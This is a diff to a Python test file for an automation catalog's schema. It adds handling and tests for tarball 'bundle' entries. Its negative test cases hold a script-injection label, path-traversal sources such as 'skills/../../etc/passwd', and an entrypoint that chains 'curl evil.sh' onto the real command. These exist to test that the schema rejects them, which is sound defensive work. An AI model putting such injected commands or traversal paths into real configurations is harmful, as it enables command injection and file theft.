@@ -32,15 +32,27 @@ ROOT = Path(__file__).resolve().parents[1]
 SCHEMA_PATH = ROOT / "automations" / "catalog.schema.json"
 CATALOG_DIR = ROOT / "automations" / "catalog"
 CATALOG_INDEX = ROOT / "automations" / "catalog-index.js"
+BUNDLE_INDEX = ROOT / "automations" / "bundle-index.js"
 BUILD_SCRIPT = ROOT / "scripts" / "build-automation-catalog.mjs"
 FIXTURE_DIR = ROOT / "tests" / "fixtures" / "automations"
 CAPABILITIES_PATH = FIXTURE_DIR / "capabilities.json"
 INTEGRATION_CATALOG_DIR = ROOT / "integrations" / "catalog"
 
 # The standardized parts of a direct setup, identical for every automation and
-# therefore not declared in any entry.
+# therefore not declared in any entry. Which create endpoint is used follows
+# from what the entry produces: a prompt is a preset, a bundle is a tarball the
+# host uploads and then creates from, which is the raw endpoint.
 CREATE_PATH = "/v1/preset/prompt"
+BUNDLE_CREATE_PATH = "/v1"
+BUNDLE_UPLOAD_PATH = "/v1/uploads"
 PREFLIGHT_PATH = "/v1/validate"
+
+# Preflight runs while the form is being filled in and the upload happens once,
+# at submit, so a bundle draft has no tarball path to send yet. The service
+# checks that field's scheme at preflight and its ownership only at creation,
+# so a well-formed stand-in validates what preflight is for - the rest of the
+# body - without uploading an archive per keystroke.
+PREFLIGHT_TARBALL_PATH = "oh-internal://uploads/00000000-0000-0000-0000-000000000000"
 
 # The trigger properties the service accepts, per kind. A form field named
 # after one of them fills it; the rest are inputs to the declared filter.
@@ -84,8 +96,28 @@ def _fixture_bundles():
         yield pytest.param(path, id=path.stem)
 
 
+def _inlined_bundles() -> dict:
+    """The generated bundle index, read as data rather than executed."""
+    body = BUNDLE_INDEX.read_text()
+    marker = "export const AUTOMATION_BUNDLE_FILES = "
+    return json.loads(body[body.index(marker) + len(marker) :].rstrip().rstrip(";"))
+
+
 def _entry_for(bundle: dict) -> dict:
     return _load(CATALOG_DIR / bundle["automationId"] / "manifest.json")
+
+
+def _uploaded_path(scenario: dict) -> str:
+    """Where a bundle scenario's tarball landed, as the upload step reported it.
+
+    A preset scenario has no upload step and never reads this.
+    """
+    return (
+        scenario.get("upload", {})
+        .get("response", {})
+        .get("body", {})
+        .get("tarball_path", "")
+    )
 
 
 def _integration_catalog_ids() -> set[str]:
@@ -133,30 +165,46 @@ def _repo_picker(setup: dict) -> tuple[str | None, dict | None]:
     return None, None
 
 
-def _render_payload(entry: dict, form_values: dict) -> dict:
-    """The create request body these form values produce.
+def _is_bundle(entry: dict) -> bool:
+    """Whether this entry ships a script tarball instead of a prompt."""
+    return "bundle" in entry.get("setup", {})
 
-    No entry declares this. `name` comes from the entry, `repos` from the
-    repo-picker field and its provider, and `trigger` from the key and fields
-    under `form.triggers`. Only `prompt` and an event `filter` are declared,
-    because only they cannot be read off the form.
+
+def _create_path(entry: dict) -> str:
+    return BUNDLE_CREATE_PATH if _is_bundle(entry) else CREATE_PATH
+
+
+def _repo_values(setup: dict, form_values: dict) -> list[str]:
+    """Every repository the form collected, whether it collects one or many.
+
+    A `multiple` picker holds a list; a single one holds a string. Reading both
+    as a list is what keeps the rest of the derivation from branching.
     """
+    name, field = _repo_picker(setup)
+    if not name:
+        return []
+    value = form_values.get(name)
+    if value is None or value == "":
+        return []
+    if field and field.get("multiple"):
+        return list(value)
+    return [value]
+
+
+def _derive_name(entry: dict, form_values: dict) -> str:
+    """The created automation's name. One repository is worth naming; several
+    are not, so the count stands in rather than a list that never fits."""
+    repos = _repo_values(entry["setup"], form_values)
+    if not repos:
+        return entry["name"]
+    if len(repos) == 1:
+        return f"{entry['name']} - {repos[0]}"
+    return f"{entry['name']} - {len(repos)} repositories"
+
+
+def _derive_trigger(entry: dict, form_values: dict) -> dict:
+    """The `trigger` object, read off the key and fields under form.triggers."""
     setup = entry["setup"]
-    context = _context(entry, form_values)
-    repo_name, repo_field = _repo_picker(setup)
-    repo = form_values.get(repo_name) if repo_name else None
-
-    body: dict = {
-        "name": f"{entry['name']} - {repo}" if repo else entry["name"],
-        "prompt": _interpolate(setup["prompt"], context),
-    }
-
-    if repo:
-        source = {"url": repo, "provider": repo_field["provider"]}
-        if "ref" in form_values:
-            source["ref"] = form_values["ref"]
-        body["repos"] = [source]
-
     kind, trigger_fields = next(iter(setup["form"]["triggers"].items()))
     trigger = {"type": kind}
     # A field under a trigger kind fills the trigger property of the same name.
@@ -165,9 +213,81 @@ def _render_payload(entry: dict, form_values: dict) -> dict:
         if name in TRIGGER_PROPERTIES[kind]:
             trigger[name] = form_values[name]
     if kind == "event":
+        _, repo_field = _repo_picker(setup)
         trigger["source"] = repo_field["provider"]
-        trigger["filter"] = _interpolate(setup["filter"], context)
-    body["trigger"] = trigger
+        trigger["filter"] = _interpolate(setup["filter"], _context(entry, form_values))
+    return trigger
+
+
+def _render_bundle_payload(entry: dict, form_values: dict, tarball_path: str) -> dict:
+    """The raw create body a bundle entry produces.
+
+    `tarball_path` is the one value that is neither declared nor derived: the
+    host uploads the packed bundle first and creates from what came back. The
+    rest follows the same rule as the preset path - only `config` is declared,
+    because only the entry knows which key of its own script each field fills.
+    """
+    bundle = entry["setup"]["bundle"]
+    body: dict = {
+        "name": _derive_name(entry, form_values),
+        "trigger": _derive_trigger(entry, form_values),
+        "tarball_path": tarball_path,
+        "entrypoint": bundle["entrypoint"],
+    }
+    if "setupScript" in bundle:
+        body["setup_script_path"] = bundle["setupScript"]
+    if "timeout" in bundle:
+        body["timeout"] = bundle["timeout"]
+    body["template"] = {
+        "id": entry["id"],
+        "version": bundle["version"],
+        "config": _interpolate(bundle["config"], _context(entry, form_values)),
+    }
+    return body
+
+
+def _render_payload(entry: dict, form_values: dict, tarball_path: str = "") -> dict:
+    """The create request body these form values produce.
+
+    No entry declares this. `name` comes from the entry, `repos` from the
+    repo-picker field and its provider, and `trigger` from the key and fields
+    under `form.triggers`. Only `prompt` (or, for a bundle, `config`) and an
+    event `filter` are declared, because only they cannot be read off the form.
+    """
+    if _is_bundle(entry):
+        return _render_bundle_payload(entry, form_values, tarball_path)
+
+    setup = entry["setup"]
+    context = _context(entry, form_values)
+    _, repo_field = _repo_picker(setup)
+    repos = _repo_values(setup, form_values)
+
+    body: dict = {
+        "name": _derive_name(entry, form_values),
+        "prompt": _interpolate(setup["prompt"], context),
+    }
+
+    if repos:
+        body["repos"] = [
+            {
+                "url": repo,
+                "provider": repo_field["provider"],
+                **({"ref": form_values["ref"]} if "ref" in form_values else {}),
+            }
+            for repo in repos
+        ]
+
+    body["trigger"] = _derive_trigger(entry, form_values)
+
+    # A versioned entry sends its provenance: the service stores it opaquely,
+    # keyed by id for idempotent creation. The form values are non-secret by
+    # design (credentials come only from connected integrations).
+    if "version" in entry:
+        body["template"] = {
+            "id": entry["id"],
+            "version": entry["version"],
+            "config": dict(form_values),
+        }
 
     return body
 
@@ -177,8 +297,8 @@ def _derive_preflight_body(entry: dict, form_values: dict) -> dict:
     so no entry declares it."""
     return {
         "automationId": entry["id"],
-        "endpoint": CREATE_PATH,
-        "draft": _render_payload(entry, form_values),
+        "endpoint": _create_path(entry),
+        "draft": _render_payload(entry, form_values, PREFLIGHT_TARBALL_PATH),
         "requirements": _derive_preflight_requirements(entry),
     }
 
@@ -258,7 +378,7 @@ def _derive_error_map(entry: dict) -> dict[str, list[str]]:
     an entry does not declare it.
     """
     mapping: dict[str, list[str]] = {}
-    if "prompt" not in entry["setup"]:
+    if "prompt" not in entry["setup"] and not _is_bundle(entry):
         return mapping
 
     stand_ins = {name: f"{{{{form.{name}}}}}" for name in _field_names(entry["setup"])}
@@ -347,8 +467,8 @@ def _reported_fields(entry: dict, scenario: dict) -> dict[str, str]:
     setup = entry["setup"]
     error_map = _derive_error_map(entry)
     payload = (
-        _render_payload(entry, scenario["formValues"])
-        if "prompt" in setup and "formValues" in scenario
+        _render_payload(entry, scenario["formValues"], _uploaded_path(scenario))
+        if ("prompt" in setup or _is_bundle(entry)) and "formValues" in scenario
         else {}
     )
 
@@ -436,7 +556,7 @@ def test_schema_rejects_content_a_setup_block_must_never_carry() -> None:
     rejected: list[tuple[str, dict]] = []
 
     with_markup = deepcopy(entry)
-    with_markup["setup"]["form"]["args"]["repository"]["label"] = (
+    with_markup["setup"]["form"]["args"]["repositories"]["label"] = (
         "Repository <script>steal()</script>"
     )
     rejected.append(("<script>steal()</script>", with_markup))
@@ -455,11 +575,48 @@ def test_schema_rejects_content_a_setup_block_must_never_carry() -> None:
     with_repeated_identity["setup"]["description"] = "a second description"
     rejected.append(("description", with_repeated_identity))
 
+    with_bad_version = deepcopy(entry)
+    with_bad_version["version"] = "1.0"
+    rejected.append(("'1.0' does not match", with_bad_version))
+
+    with_multiple_triggers = deepcopy(entry)
+    with_multiple_triggers["setup"]["form"]["triggers"]["event"] = {
+        "on": {
+            "type": "text",
+            "label": "Event",
+            "help": "Event type",
+            "required": True,
+        }
+    }
+    rejected.append(("has too many properties", with_multiple_triggers))
+
     for expected_fragment, invalid in rejected:
         errors = list(VALIDATOR.iter_errors(invalid))
         assert any(expected_fragment in error.message for error in errors), (
             f"schema accepted an entry it must reject ({expected_fragment}): {errors}"
         )
+
+
+IMPACT_REJECTIONS: list[tuple[str, dict]] = [
+    ("a basis the host does not know how to compute", {"basis": "run-counter"}),
+    ("markup in a phrase", {"one": "<b>1 sweep</b>"}),
+    ("a placeholder from another namespace", {"other": "{{count}} sweeps for {{form.repo}}"}),
+    ("a plural phrase that hides the count", {"other": "many sweeps completed"}),
+    ("an extra key beside the declared three", {"detail": "and saved hours"}),
+]
+
+
+@pytest.mark.parametrize(
+    ("case", "override"),
+    [pytest.param(case, override, id=case) for case, override in IMPACT_REJECTIONS],
+)
+def test_schema_refuses_an_impact_statement_the_host_must_never_render(
+    case: str, override: dict
+) -> None:
+    entry = deepcopy(_load(CATALOG_DIR / "github-pr-reviewer" / "manifest.json"))
+    entry["impact"].update(override)
+
+    assert list(VALIDATOR.iter_errors(entry)), f"schema admitted {case}"
 
 
 @pytest.mark.parametrize("entry_path", list(_setup_paths()))
@@ -476,6 +633,26 @@ def test_form_placeholders_reference_declared_fields(entry_path: Path) -> None:
     }
 
     assert referenced - fields == set()
+
+
+@pytest.mark.parametrize("entry_path", list(_setup_paths()))
+def test_the_declared_features_match_the_archetype(entry_path: Path) -> None:
+    """A bundle needs a deployment that runs a client-supplied tarball; a prompt
+    needs the preset endpoint. Declaring the other one's features is a check the
+    host runs against the wrong capability, so the entry is either offered where
+    it cannot run or withheld where it can."""
+    entry = _load(entry_path)
+    features = set(entry["requires"].get("features", []))
+
+    if _is_bundle(entry):
+        assert "customTarball" in features, f"{entry['id']}: a bundle must declare customTarball"
+        assert "presetPrompt" not in features, (
+            f"{entry['id']}: a bundle creates through {BUNDLE_CREATE_PATH}, not the preset endpoint"
+        )
+    else:
+        assert "customTarball" not in features, (
+            f"{entry['id']}: only a bundle uploads a tarball"
+        )
 
 
 @pytest.mark.parametrize("entry_path", list(_setup_paths()))
@@ -503,10 +680,10 @@ def test_derived_body_reproduces_the_create_request(
     where that reconstruction is pinned to a body the service accepts."""
     entry = _entry_for(bundle)
 
-    derived = _render_payload(entry, scenario["formValues"])
+    derived = _render_payload(entry, scenario["formValues"], _uploaded_path(scenario))
 
     assert derived == scenario["create"]["request"]["body"]
-    assert scenario["create"]["request"]["path"] == CREATE_PATH
+    assert scenario["create"]["request"]["path"] == _create_path(entry)
 
 
 @pytest.mark.parametrize(("bundle", "scenario"), list(_scenarios("preflight")))
@@ -574,12 +751,97 @@ def test_blocked_by_lists_exactly_the_unsatisfiable_deployments(
 def test_generated_catalog_index_is_up_to_date() -> None:
     """Re-running the codegen script should produce identical output."""
     before = CATALOG_INDEX.read_text()
+    bundles_before = BUNDLE_INDEX.read_text()
     subprocess.run(
         ["node", str(BUILD_SCRIPT)], cwd=str(ROOT), check=True, capture_output=True
     )
     assert CATALOG_INDEX.read_text() == before, (
         "automations/catalog-index.js is out of date - run: npm run build:automations"
     )
+    assert BUNDLE_INDEX.read_text() == bundles_before, (
+        "automations/bundle-index.js is out of date - run: npm run build:automations"
+    )
+
+
+@pytest.mark.parametrize("entry_path", list(_setup_paths()))
+def test_bundle_files_exist_and_are_inlined(entry_path: Path) -> None:
+    """A bundle names repository paths; the package ships their contents.
+
+    The host packing the tarball has the published package but not this
+    repository, so a path that resolves here and nowhere else would produce an
+    entry that installs in CI and fails for every user.
+    """
+    entry = _load(entry_path)
+    if not _is_bundle(entry):
+        pytest.skip("not a bundle entry")
+
+    bundle = entry["setup"]["bundle"]
+    inlined = _inlined_bundles()
+
+    assert set(inlined) >= {entry["id"]}
+    for packed_path, source in bundle["files"].items():
+        assert (ROOT / source).is_file(), f"{source} does not exist"
+        assert inlined[entry["id"]][packed_path] == (ROOT / source).read_text()
+
+    # The entrypoint has to name something the tarball actually contains.
+    packed = set(bundle["files"]) | {"config.json"}
+    assert any(word in packed for word in bundle["entrypoint"].split()), (
+        f"entrypoint {bundle['entrypoint']!r} names no packed file"
+    )
+    if "setupScript" in bundle:
+        assert bundle["setupScript"] in packed
+
+
+# A bundle is the one part of a manifest naming files and a command the host
+# acts on, so the schema is what stands between an entry and the host doing it.
+BUNDLE_REJECTIONS = [
+    ("a packed path that climbs out of the archive", {"files": {"../main.py": "skills/github-pr-reviewer/scripts/main.py"}}),
+    ("a packed path that is a bare dot segment", {"files": {"./main.py": "skills/github-pr-reviewer/scripts/main.py"}}),
+    ("a source that traverses out of the repository", {"files": {"main.py": "skills/../../etc/passwd"}}),
+    ("a source outside skills/ and automations/", {"files": {"main.py": "python/main.py"}}),
+    ("an entrypoint carrying a shell metacharacter", {"entrypoint": "python3 main.py && curl evil.sh"}),
+    ("a setup script that climbs out of the archive", {"setupScript": "../setup.sh"}),
+    ("a version that is not a semantic version", {"version": "latest"}),
+    ("no files at all", {"files": {}}),
+]
+
+
+@pytest.mark.parametrize(
+    ("case", "override"),
+    [pytest.param(case, override, id=case) for case, override in BUNDLE_REJECTIONS],
+)
+def test_schema_refuses_an_unsafe_bundle(case: str, override: dict) -> None:
+    entry = deepcopy(_load(CATALOG_DIR / "github-pr-reviewer" / "manifest.json"))
+    entry["setup"]["bundle"].update(override)
+
+    assert list(VALIDATOR.iter_errors(entry)), f"schema admitted {case}"
+
+
+def test_a_direct_entry_declares_a_prompt_or_a_bundle_but_not_both() -> None:
+    entry = deepcopy(_load(CATALOG_DIR / "github-pr-reviewer" / "manifest.json"))
+    entry["setup"]["prompt"] = "Review pull requests."
+
+    assert list(VALIDATOR.iter_errors(entry))
+
+    del entry["setup"]["prompt"]
+    del entry["setup"]["bundle"]
+
+    assert list(VALIDATOR.iter_errors(entry))
+
+
+@pytest.mark.parametrize("entry_path", list(_setup_paths()))
+def test_bundle_config_only_reads_declared_form_fields(entry_path: Path) -> None:
+    """config.json is the bundle's analogue of the prompt, and the same rule
+    applies: a placeholder must name an input the form actually collects."""
+    entry = _load(entry_path)
+    if not _is_bundle(entry):
+        pytest.skip("not a bundle entry")
+
+    names = _field_names(entry["setup"])
+    for value in _iter_strings(entry["setup"]["bundle"]["config"]):
+        for namespace, key in PLACEHOLDER_RE.findall(value):
+            if namespace == "form":
+                assert key in names, f"config references unknown field: {key}"
 
 
 def test_no_catalog_entry_or_fixture_carries_a_credential_value() -> None:
